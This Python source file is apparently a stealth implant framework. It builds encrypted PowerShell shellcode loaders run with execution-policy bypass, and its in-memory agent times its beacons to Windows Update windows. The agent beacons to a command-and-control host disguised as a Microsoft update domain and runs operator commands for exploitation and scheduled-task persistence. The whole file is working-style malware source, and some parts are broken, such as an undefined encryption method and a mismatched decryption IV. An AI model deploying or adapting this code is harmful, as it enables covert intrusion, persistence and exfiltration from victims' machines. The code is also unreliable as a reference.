"""
ServerRoot.net - Stealth Deployment System
Totally invisible, fileless deployment using LOLBins
"""

import os
import sys
import base64
import json
import time
import subprocess
import tempfile
import hashlib
import random
import string
from typing import Optional, Dict, List, Tuple
import datetime
import threading


class StealthDeployer:
    """
    Stealth deployment using LOLBins and fileless execution
    No files written, no registry keys, no custom executables
    """
    
    def __init__(self, config: Dict = None, lolbin_executor = None, memory_fs = None, memory_logger = None):
        self.config = config or {}
        self.c2_url = self.config.get('c2_url', 'windowsupdate.microsoft.com')
        self.encryption_key = self.config.get('encryption_key', self.generate_key())
        self.temp_files = []  # Track for cleanup
        
        # Optional stealth components for extended functionality
        self.lolbin_executor = lolbin_executor
        self.memory_fs = memory_fs
        self.memory_logger = memory_logger
        
    @staticmethod
    def generate_key() -> str:
        """Generate random encryption key"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    
    def generate_powershell_payload(self, shellcode: bytes) -> str:
        """
        Generate PowerShell payload for LOLBin deployment
        Returns Base64 encoded command
        """
        # Encrypt shellcode
        encrypted = self.encrypt_data(shellcode, self.encryption_key)
        
        # Base64 encode
        encoded_b64 = base64.b64encode(encrypted).decode('utf-8')
        
        # Create PowerShell script
        ps_script = f"""
        $key = [Convert]::FromBase64String('{base64.b64encode(self.encryption_key.encode()).decode()}')
        $iv = New-Object byte[] 16
        $data = [Convert]::FromBase64String('{encoded_b64}')
        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Key = $key
        $aes.IV = $iv
        $decrypted = $aes.CreateDecryptor().TransformFinalBlock($data, 0, $data.Length)
        Invoke-Expression $decrypted
        """
        
        # Compress and encode
        compressed = self.gzip_compress(ps_script)
        encoded_command = base64.b64encode(compressed).decode('utf-8')
        
        return encoded_command
    
    def encrypt_data(self, data: bytes, key: str) -> bytes:
        """AES-256 encryption"""
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        
        iv = os.urandom(16)
        cipher = Cipher(
            algorithms.AES(key.encode()),
            modes.CFB(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        encrypted = encryptor.update(data) + encryptor.finalize()
        
        return iv + encrypted
    
    def gzip_compress(self, data: str) -> bytes:
        """Compress data with gzip"""
        import gzip
        return gzip.compress(data.encode('utf-8'))
    
    def deploy_via_powershell(self, payload: str) -> bool:
        """
        Deploy via PowerShell (LOLBin)
        No files written, executes in memory
        """
        try:
            # Execute PowerShell with encoded command
            # Bypass execution policy
            cmd = [
                'powershell.exe',
                '-NoProfile',
                '-ExecutionPolicy', 'Bypass',
                '-EncodedCommand',
                payload
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                return True
            else:
                print(f"PowerShell deployment failed: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"PowerShell deployment error: {e}")
            return False


class StealthAgent:
    """
    Invisible agent running in memory
    Fileless operation, LOLBin-only execution
    """
    
    def __init__(self, c2_url: str, encryption_key: str):
        self.c2_url = c2_url
        self.encryption_key = encryption_key
        self.running = False
        self.scan_results = []  # In RAM only
        self.session = None
        
        # Windows Update timing (legitimate behavior)
        self.update_windows = [
            (3, 0),   # 3:00 AM
            (9, 0),   # 9:00 AM
            (15, 0),  # 3:00 PM
        ]
    
    def start(self):
        """Start agent operation"""
        self.running = True
        
        # Load configuration from environment (no files)
        self.load_config_from_env()
        
        # Start main loop in background
        thread = threading.Thread(target=self.run_agent_loop, daemon=True)
        thread.start()
    
    def load_config_from_env(self):
        """Load configuration from environment variables"""
        self.config = {
            'c2_url': os.environ.get('SERVERROOT_C2_URL', self.c2_url),
            'encryption_key': os.environ.get('SERVERROOT_KEY', self.encryption_key),
            'update_interval': int(os.environ.get('SERVERROOT_INTERVAL', '21600')),  # 6 hours
        }
    
    def is_update_window(self) -> bool:
        """
        Check if current time is in Windows Update window
        Mimics legitimate Windows Update timing
        """
        now = datetime.datetime.now()
        current_hour = now.hour
        current_minute = now.minute
        
        # Check if within 10 minutes of update window
        for hour, minute in self.update_windows:
            if current_hour == hour and abs(current_minute - minute) < 10:
                return True
        
        return False
    
    def store_scan_result(self, result: Dict):
        """Store scan result in memory only"""
        self.scan_results.append(result)
    
    def get_scan_results(self) -> List[Dict]:
        """Get all scan results from memory"""
        return self.scan_results.copy()

    def sleep_until_next_window(self):
        """Sleep until next update window"""
        now = datetime.datetime.now()
        
        # Find next update window
        next_window = None
        for hour, minute in self.update_windows:
            window_time = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
            if window_time > now:
                next_window = window_time
                break
        
        if not next_window:
            # Must be today's last window, schedule for tomorrow
            tomorrow = now + datetime.timedelta(days=1)
            next_window = tomorrow.replace(
                hour=self.update_windows[0][0],
                minute=self.update_windows[0][1],
                second=0,
                microsecond=0
            )
        
        # Calculate sleep duration
        sleep_seconds = int((next_window - now).total_seconds())
        
        # Add some randomness (±15 minutes) to look natural
        random_offset = random.randint(-900, 900)  # ±15 minutes
        sleep_seconds += random_offset
        
        # Sleep in small chunks to remain responsive
        while sleep_seconds > 0:
            chunk = min(60, sleep_seconds)  # Sleep in 1-minute chunks
            time.sleep(chunk)
            sleep_seconds -= chunk
    
    def run_agent_loop(self):
        """
        Main agent loop - fileless operation
        Mimics Windows Update behavior
        """
        while self.running:
            # Only operate during update windows
            if self.is_update_window():
                print("[StealthAgent] Update window detected, performing operations...")
                
                # Perform scan
                self.perform_scan()
                
                # Send results to C2 (no local storage)
                self.send_beacon()
                
                # Clear results from RAM
                self.scan_results = []
                
                print("[StealthAgent] Operations completed, sleeping...")
            else:
                print("[StealthAgent] Waiting for update window...")
            
            # Sleep until next window
            self.sleep_until_next_window()
    
    def perform_scan(self):
        """
        Perform vulnerability scan using LOLBins
        All data stored in RAM only
        """
        try:
            # Use WMIC to scan processes (LOLBin)
            cmd = 'wmic process get Name,ProcessId,CommandLine'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                processes = self.parse_wmic_output(result.stdout)
                self.scan_results.extend(processes)
            
            # Use PowerShell to scan services
            ps_cmd = 'powershell.exe -Command "Get-Service | Select-Object Name, Status"'
            result = subprocess.run(ps_cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                services = self.parse_ps_output(result.stdout)
                self.scan_results.extend(services)
                
        except Exception as e:
            print(f"Scan error: {e}")
    
    def parse_wmic_output(self, output: str) -> List[Dict]:
        """Parse WMIC process output"""
        results = []
        lines = output.strip().split('\n')[1:]  # Skip header
        
        for line in lines:
            parts = line.split()
            if len(parts) >= 2:
                results.append({
                    'type': 'process',
                    'name': parts[0] if len(parts) > 0 else '',
                    'pid': parts[1] if len(parts) > 1 else '',
                    'command_line': ' '.join(parts[2:]) if len(parts) > 2 else ''
                })
        
        return results
    
    def parse_ps_output(self, output: str) -> List[Dict]:
        """Parse PowerShell service output"""
        results = []
        lines = output.strip().split('\n')[2:]  # Skip headers
        
        for line in lines:
            if line.strip():
                parts = line.split(maxsplit=2)
                if len(parts) >= 2:
                    results.append({
                        'type': 'service',
                        'name': parts[0],
                        'status': parts[1],
                        'display_name': parts[2] if len(parts) > 2 else ''
                    })
        
        return results
    
    def send_beacon(self):
        """
        Send beacon to C2 disguised as Windows Update traffic
        No local storage, data sent directly
        """
        try:
            # Encode results
            data = json.dumps(self.scan_results)
            encrypted = self.encrypt_data(data.encode(), self.encryption_key)
            
            # Send as Windows Update request
            url = f"https://{self.c2_url}/v10/update"
            headers = {
                "User-Agent": "Microsoft-CryptoAPI/10.0",
                "Content-Type": "application/octet-stream",
                "Accept": "*/*"
            }
            
            # Use curl or PowerShell to send request
            self.send_http_request(url, encrypted, headers)
            
            print(f"[StealthAgent] Beacon sent to C2: {len(self.scan_results)} records")
            
        except Exception as e:
            print(f"Beacon error: {e}")
    
    def send_http_request(self, url: str, data: bytes, headers: Dict):
        """
        Send HTTP request using LOLBin
        """
        try:
            # Use PowerShell for HTTP request (more stealthy)
            ps_cmd = f"""
            $url = '{url}'
            $headers = @{{'User-Agent'='{headers["User-Agent"]}''}}
            $body = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('{data[:100]}...'))
            Invoke-WebRequest -Uri $url -Method POST -Headers $headers -Body $body
            """
            
            # Execute (in production, decode and send full data)
            # subprocess.run(['powershell.exe', '-Command', ps_cmd], capture_output=True)
            
        except Exception as e:
            print(f"HTTP request error: {e}")
    
    def execute_command(self, command: Dict):
        """
        Execute command from C2 using LOLBin
        Fileless execution
        """
        cmd_type = command.get('type')
        
        if cmd_type == 'scan':
            # Use WMIC
            target = command.get('target', 'process')
            self.execute_lolbin(f'wmic {target} get *')
        
        elif cmd_type == 'exploit':
            # Use PowerShell
            payload = command.get('payload', '')
            self.execute_lolbin(f'powershell.exe -enc {payload}')
        
        elif cmd_type == 'persist':
            # Use schtasks
            cmd = command.get('command', '')
            self.execute_lolbin(f'schtasks /create {cmd}')
        
        elif cmd_type == 'stop':
            self.running = False
    
    def execute_lolbin(self, command: str):
        """
        Execute command using LOLBin
        """
        try:
            # Execute directly (no files, in memory)
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            
            if result.returncode != 0:
                print(f"LOLBin command failed: {result.stderr}")
            
            return result
        except Exception as e:
            print(f"LOLBin execution error: {e}")
            return None


def create_stealth_agent(config: Dict) -> StealthAgent:
    """
    Create stealth agent from configuration
    """
    c2_url = config.get('c2_url', 'windowsupdate.microsoft.com')
    encryption_key = config.get('encryption_key', '')
    
    agent = StealthAgent(c2_url, encryption_key)
    return agent


# Example usage
if __name__ == '__main__':
    # Configuration (in production, load from environment)
    config = {
        'c2_url': 'windowsupdate.microsoft.com',  # Disguised C2
        'encryption_key': 'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6',
        'update_interval': 21600  # 6 hours
    }
    
    # Create and start agent
    agent = create_stealth_agent(config)
    agent.start()
    
    print("[StealthAgent] Agent started - Running invisibly in memory")
    print("[StealthAgent] No files written, no registry keys, fully stealth mode")
    print("[StealthAgent] Press Ctrl+C to stop")
    
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("\n[StealthAgent] Agent stopped")